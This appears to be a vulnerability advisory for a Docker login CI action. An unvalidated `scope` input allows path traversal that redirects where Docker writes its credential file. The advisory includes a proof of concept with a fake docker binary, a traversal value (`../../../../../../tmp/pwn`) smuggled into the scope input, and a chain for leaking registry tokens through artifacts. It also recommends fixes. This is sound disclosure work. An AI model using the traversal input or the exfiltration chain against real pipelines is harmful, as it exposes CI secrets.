# Path Traversal → Arbitrary Docker Credential Write (Scoped Buildx Config)

## Summary

A path traversal vulnerability exists in the login action when processing the `scope` input.
The function responsible for determining the Buildx configuration directory constructs filesystem paths using:

```
path.join(baseDir, scope)
```

without validating or constraining `scope`.
Because `path.join` normalizes `../` segments, an attacker-controlled `scope` can escape the intended Buildx directory and influence the `DOCKER_CONFIG` environment variable.
Docker then writes `config.json` to this attacker-controlled location during `docker login`.
This results in an arbitrary credential file write primitive.

## Impact

If an attacker can control `scope` (for example via `workflow_dispatch`, PR inputs, composite actions, or untrusted variables), they can:

### Credential Exfiltration

Write Docker authentication material outside the sandbox:

- Workspace directories
- Artifact paths
- Cache paths
- Uploaded directories

Later workflow steps may upload or expose the file.

### Supply-Chain Confusion

Poison filesystem locations used by later build steps:

- Overwrite `.docker/config.json`
- Confuse subsequent docker commands
- Inject attacker registry auth
- Pull/push from attacker registry

### CI Secret Exposure

Chainable in real pipelines:

1. Write credentials to uploadable location
2. Artifact upload publishes it
3. Attacker retrieves registry token

## Root Cause

The scope value is concatenated into a filesystem path without canonical validation:

```
scopeToConfigDir(...)
  -> path.join(baseDir, scope)
      (no traversal check)
```

Normalized `../` escapes the intended directory.
The resulting path is exported into:

```
DOCKER_CONFIG=<attacker-controlled-path>
```

Docker then creates:

```
$DOCKER_CONFIG/config.json
```

## Proof of Concept

### 1. Clone the project

```bash
git clone <repo-url> login-action
cd login-action
```

### 2. Create a fake docker binary

(No real credentials or daemon required)

```bash
mkdir -p /tmp/pocbin /tmp/login-poc

cat > /tmp/pocbin/docker <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

cmd="$1"; shift || true

printf 'cmd=%s DOCKER_CONFIG=%s args=%s\n' \
"$cmd" "${DOCKER_CONFIG:-}" "$*" >> /tmp/login-poc/invocations.log

if [ "$cmd" = "login" ]; then
  cat >/dev/null || true
  mkdir -p "${DOCKER_CONFIG}"
  echo '{"auths":{"example":{"auth":"dGVzdDp0ZXN0"}}}' > "${DOCKER_CONFIG}/config.json"
fi

exit 0
EOF

chmod +x /tmp/pocbin/docker
```

### 3. Execute the action with malicious scope

```bash
PATH="/tmp/pocbin:$PATH" \
RUNNER_TEMP="/tmp/runner" \
INPUT_USERNAME="test" \
INPUT_PASSWORD="test" \
INPUT_SCOPE='../../../../../../tmp/pwn' \
INPUT_LOGOUT='false' \
node dist/index.js
```

### 4. Verify exploitation

```bash
cat /tmp/login-poc/invocations.log
ls -la /tmp/pwn
cat /tmp/pwn/config.json
```

### Expected Output (Proof)

DOCKER_CONFIG escaped sandbox:

```
cmd=login DOCKER_CONFIG=/tmp/pwn args=...
```

Credential file written outside intended directory:

```
/tmp/pwn/config.json exists
```

This confirms attacker-controlled file write via scope traversal.

## Security Impact Classification

Vulnerability Type: Path Traversal → Arbitrary File Write
Primitive: Credential Write / Secret Exfiltration
Attack Vector: Untrusted workflow input
Impact: Supply chain compromise / CI secret leakage

## Recommended Fix

### 1. Canonicalize and constrain path

Resolve the final path and enforce it stays under the base directory:

```js
const resolved = path.resolve(baseDir, scope);

if (!resolved.startsWith(baseDir + path.sep)) {
  throw new Error("Invalid scope: path traversal detected");
}
```

### 2. Reject unsafe scope values

Disallow:

- `..`
- absolute paths
- path separators

Example:

```js
if (scope.includes("..") || path.isAbsolute(scope)) {
  throw new Error("Invalid scope");
}
```

### 3. Remove raw concatenation branch

Ensure all scope handling follows the same validation logic.

## Conclusion

The action allows attacker-controlled `scope` values to escape the Buildx configuration directory and control the `DOCKER_CONFIG` path. Because Docker writes credentials to this path, the bug provides a reliable arbitrary credential file write primitive, enabling CI secret exfiltration and supply-chain abuse.
